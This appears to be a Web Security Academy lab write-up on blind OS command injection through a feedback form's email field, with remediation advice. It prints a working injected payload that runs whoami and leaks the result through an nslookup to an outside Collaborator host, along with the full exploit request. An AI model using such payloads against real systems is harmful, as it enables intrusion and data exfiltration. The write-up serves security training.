# Vulnerability Report: Blind OS Command Injection with Out-of-Band (OOB) Data Exfiltration

##  Executive Summary
A **Blind OS Command Injection** vulnerability was identified in the feedback submission feature of the target web application. The application processes user input asynchronously in the background. Because system outputs (`stdout` and `stderr`) are not returned within the HTTP responses, standard error-based or echo-based injection techniques are ineffective. 

However, by breaking out of the backend execution flow using command separators (`||`), an attacker can trigger **Out-of-Band (OOB) Data Exfiltration**. This configuration forces the hosting server to perform an unauthorized external DNS lookup (`nslookup`), nesting local system variables (such as the output of `whoami`) directly inside the requested domain name to leak data to a controller listener.

---

## 🛠️ Technical Analysis & Root Cause
The web application passes unvalidated user-supplied parameters directly into an operating system shell execution string. 

* **The Vulnerability Context:** The input fields are targeted by asynchronous operations. No application errors or outputs are reflected in the response body.
* **The Exploit Strategy:** To bypass the "blind" nature of this flaw, we leverage **Command Substitution** (`$()`) combined with an active network query tool (`nslookup`). This structure forces the target server to resolve a dynamically constructed subdomain, broadcasting infrastructure details over public DNS queries.

---

## 🏁 Step-by-Step Exploitation

### Step 1: Intercept the Target Request
Navigate to the `/feedback` section of the website. Submit a sample form and capture the transaction traffic using your interceptor proxy (e.g., Burp Suite). Send the `POST /feedback/submit` request to the **Repeater** tab.

```http
POST /feedback/submit HTTP/2
Host: 0ad600d00484267e811f111900010068.web-security-academy.net
Cookie: session=oIOGYtcaocVJ4F68cIAMirjdz5ZBXCBX
Content-Length: 162
Content-Type: application/x-www-form-urlencoded

csrf=0FENmVapu2n02AnMO28m8YV9b2P3IjLA&name=belpheg3r&email=test%40test.com&subject=123&message=124
```

### Step 2: Initialize an Out-of-Band Listener
Generate a unique host interaction link via the **Burp Collaborator** client. Copy the generated domain name. (For this session, we will utilize: `://oastify.com`).

### Step 3: Craft and Inject the OOB Payload
The vulnerability resides within the `email` parameter. We apply the logical `||` operator to chain our payload, executing it if the initial command string fails or exits natively.

#### Raw Payload Architecture:
```text
x||nslookup $(whoami).://oastify.com||
```

#### Syntax Breakdown:
* `||`: Linux Logical OR separator. If the primary application command fails, the system executes the trailing command sequence.
* `nslookup`: Initiates an external DNS querying query.
* `$(whoami)`: POSIX standard **Command Substitution**. The underlying Linux shell stops, executes the `whoami` system utility, and drops the raw string directly back into the root namespace.
* `+` (Space): Replaces white spaces to remain fully compatible within form data parsing blocks.

### Step 4: Encode and Submit the Request
To ensure accurate delivery without breaking form boundaries, select the raw payload string inside Burp Repeater and press `Ctrl + U` (or `Cmd + U` on macOS) to URL-encode critical control characters (`|`, `$`, `(`, `)`).

#### Final Exploit Request Vector:
```http
POST /feedback/submit HTTP/2
Host: 0ad600d00484267e811f111900010068.web-security-academy.net
Cookie: session=oIOGYtcaocVJ4F68cIAMirjdz5ZBXCBX
Content-Length: 172
Content-Type: application/x-www-form-urlencoded

csrf=0FENmVapu2n02AnMO28m8YV9b2P3IjLA&name=belpheg3r&email=x%7c%7cnslookup+%24%28whoami%29.://oastify.com%7c%7c&subject=123&message=124
```

Click **Send**. The application returns a standard `200 OK` structure.

### Step 5: Extract Exfiltrated System Credentials
Return to the **Burp Collaborator** panel and click **Poll Now**. Inspect the incoming DNS request capture array. You will observe an active network lookup initiated by the application server:

```text
The Collaborator server received a DNS lookup of type A for the domain name:
peter-XXXXXX.://oastify.com
```

The system environment context string prefix has been successfully leaked: **`peter-XXXXXX`**.

---

##  Mitigation & Remediation

To safely eliminate command injection vectors, integrate the following engineering defensive patterns:

### 1. Avoid Direct Shell Invocation (Primary defense)
Do not use wrapper interfaces that spawn system shells (`system()`, `popen()`, `exec()` in C/C++, `child_process.exec()` in Node.js, or `os.system()` in Python). Utilize native framework API packages (e.g., safe SMTP mailer libraries) instead of raw OS utilities.

### 2. Argument Isolation (Parameterization)
When execution of binaries is required, pass parameter fields within fixed element arrays. This forces the host operating system to handle the inputs strictly as literal string arguments rather than executable shell control syntax.

* **Dangerous:** `child_process.exec("nslookup " + user_input)`
* **Secure:** `child_process.execFile("/usr/bin/nslookup", [user_input])`

### 3. Strict Input Whitelisting
Enforce aggressive input character filtering metrics at the controller layer. Restrict complex email structures to safe regex maps (`^[a-zA-Z0-9@.]+$`). Explicitly drop or sanitize control characters like `;`, `|`, `&`, `$`, and backticks.

### 4. Network Egress Filtering
Implement firewall rules on server assets. Deny unauthenticated outbound DNS query transmissions or HTTP requests to public external internet zones. Limit infrastructure endpoints to pre-approved internal network blocks.


<img width="956" height="446" alt="Screenshot 2026-07-24 155332" src="https://github.com/user-attachments/assets/e99cb6ae-a109-480a-b7d0-a07a9d075de4" />
<img width="955" height="446" alt="Screenshot 2026-07-24 164736" src="https://github.com/user-attachments/assets/1cf19602-57b1-433b-a35c-6a04e1e18cd6" />
